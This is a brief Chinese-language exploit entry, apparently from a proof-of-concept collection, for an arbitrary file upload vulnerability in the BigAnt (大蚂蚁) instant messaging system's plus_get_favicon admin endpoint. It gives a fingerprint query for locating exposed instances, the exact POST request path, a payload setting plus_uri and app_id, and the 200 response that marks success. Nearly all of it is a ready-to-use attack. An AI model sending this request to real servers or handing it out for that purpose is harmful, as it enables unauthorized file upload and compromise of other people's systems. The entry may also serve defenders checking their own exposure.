# 大蚂蚁(BigAnt)即时通讯系统plus_get_favicon存在任意文件上传漏洞

大蚂蚁(BigAnt)即时通讯系统 ｜ 文件上传 ｜ —
- **指纹**：`product="即时通讯系统"`
- **请求**：`POST /?m=Admin&c=Plus&a=plus_get_favicon HTTP/1.1`

**Payload**
```
plus_uri=http://127.0.0.1:80&app_id=pc_client
```
- **响应特征**：200